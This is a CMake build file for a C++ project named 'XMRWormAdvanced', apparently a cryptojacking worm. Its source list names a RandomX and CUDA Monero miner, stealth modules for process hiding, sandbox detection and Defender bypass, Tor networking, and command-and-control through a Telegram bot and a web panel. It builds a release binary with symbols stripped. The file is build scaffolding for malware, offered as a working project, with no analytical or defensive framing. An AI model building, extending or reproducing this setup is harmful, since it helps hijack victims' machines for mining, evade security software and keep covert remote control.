cmake_minimum_required(VERSION 3.20)
project(XMRWormAdvanced VERSION 2.0.0 LANGUAGES CXX C)

# Set standard properties globally because they apply to everything
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Determine the build type
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release CACHE STRING "Build type" FORCE)
endif()

# Check for CPU features
include(CheckCXXCompilerFlag)
check_cxx_compiler_flag("-mavx512f" COMPILER_SUPPORTS_AVX512)
check_cxx_compiler_flag("-mavx2" COMPILER_SUPPORTS_AVX2)
check_cxx_compiler_flag("-mbmi2" COMPILER_SUPPORTS_BMI2)

# Find dependencies
find_package(OpenSSL REQUIRED)
find_package(CURL REQUIRED)
find_package(Threads REQUIRED)
find_package(nlohmann_json CONFIG REQUIRED)

# Check for NUMA support Linux-specifically
find_library(NUMA_LIBRARY numa)
if(NUMA_LIBRARY)
    set(HAVE_NUMA TRUE)
    message(STATUS "NUMA support found")
else()
    set(HAVE_NUMA FALSE)
    message(STATUS "NUMA support not found")
endif()



set(RANDOMX_DIR "${CMAKE_CURRENT_SOURCE_DIR}/third_party/RandomX")
if(NOT EXISTS "${RANDOMX_DIR}/CMakeLists.txt")
    message(STATUS "Cloning RandomX...")
    execute_process(COMMAND git clone --depth 1 https://github.com/tevador/RandomX.git ${RANDOMX_DIR})
endif()
add_subdirectory(${RANDOMX_DIR} third_party/RandomX EXCLUDE_FROM_ALL)

# CUDA support
find_package(CUDAToolkit QUIET)
if(CUDAToolkit_FOUND)
    set(ENABLE_CUDA ON)
    enable_language(CUDA)
    set(CMAKE_CUDA_ARCHITECTURES 75 80 86 89 90)
    message(STATUS "CUDA found, enabling GPU support")
else()
    set(ENABLE_CUDA OFF)
    message(STATUS "CUDA not found. Building without GPU support.")
endif()

# Source files
set(CORE_SOURCES
    src/main.cpp
    src/miner/miner.cpp
    src/miner/randomx_engine.cpp
    src/miner/stats.cpp
    src/stealth/process_hider.cpp
    src/stealth/watchdog.cpp
    src/stealth/environment_detector.cpp
    src/stealth/defender_bypass.cpp
    src/network/pool_client.cpp
    src/network/pool_balancer.cpp
    src/network/tor_handler.cpp
    src/network/remote_config.cpp
    src/gpu/gpu_miner.cpp
    src/utils/crypto.cpp
    src/utils/config.cpp
    src/utils/logger.cpp
    src/c2/telegram_bot.cpp
    src/c2/web_panel.cpp
)

if(ENABLE_CUDA)
    list(APPEND CORE_SOURCES src/gpu/cuda_miner.cu)
endif()

# Define the main executable
add_executable(xmr_worm_advanced ${CORE_SOURCES})

# Modern target-specific include directories
target_include_directories(xmr_worm_advanced PRIVATE
    $<BUILD_INTERFACE:${CMAKE_CURRENT_SOURCE_DIR}/include>
    ${RANDOMX_DIR}/src
)

# Apply performance compiler flags specific to this target
if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang")
    target_compile_options(xmr_worm_advanced PRIVATE
        -Wall -Wextra -Wpedantic
        -fno-rtti
        $<$<CONFIG:Release>:-O3 -flto -fomit-frame-pointer -funroll-loops>
        $<$<CONFIG:Debug>:-O0 -g -DDEBUG>
    )

    if(COMPILER_SUPPORTS_AVX512)
        target_compile_options(xmr_worm_advanced PRIVATE -mavx512f -mavx512cd -mavx512bw -mavx512dq -mavx512vl)
    elseif(COMPILER_SUPPORTS_AVX2)
        target_compile_options(xmr_worm_advanced PRIVATE -mavx2)
    endif()

    if(COMPILER_SUPPORTS_BMI2)
        target_compile_options(xmr_worm_advanced PRIVATE -mbmi2)
    endif()
endif()

# Link imported targets
target_link_libraries(xmr_worm_advanced PRIVATE
    randomx
    OpenSSL::SSL
    OpenSSL::Crypto
    CURL::libcurl
    nlohmann_json::nlohmann_json
    Threads::Threads
)

if(UNIX)
    target_link_libraries(xmr_worm_advanced PRIVATE ${CMAKE_DL_LIBS})
endif()

if(WIN32)
    target_link_libraries(xmr_worm_advanced PRIVATE ws2_32 psapi crypt32)
endif()

if(HAVE_NUMA)
    target_link_libraries(xmr_worm_advanced PRIVATE ${NUMA_LIBRARY})
    target_compile_definitions(xmr_worm_advanced PRIVATE HAVE_NUMA)
endif()

if(ENABLE_CUDA)
    target_link_libraries(xmr_worm_advanced PRIVATE CUDA::cudart)
    target_compile_options(xmr_worm_advanced PRIVATE $<$<COMPILE_LANGUAGE:CUDA>:--compiler-options -O3>)
endif()

# Release Linker Optimizations
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    set_property(TARGET xmr_worm_advanced PROPERTY INTERPROCEDURAL_OPTIMIZATION TRUE)
    if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang")
        target_link_options(xmr_worm_advanced PRIVATE -Wl,--strip-all)
    endif()
endif()

# Installation rules
install(TARGETS xmr_worm_advanced
    RUNTIME DESTINATION bin
)
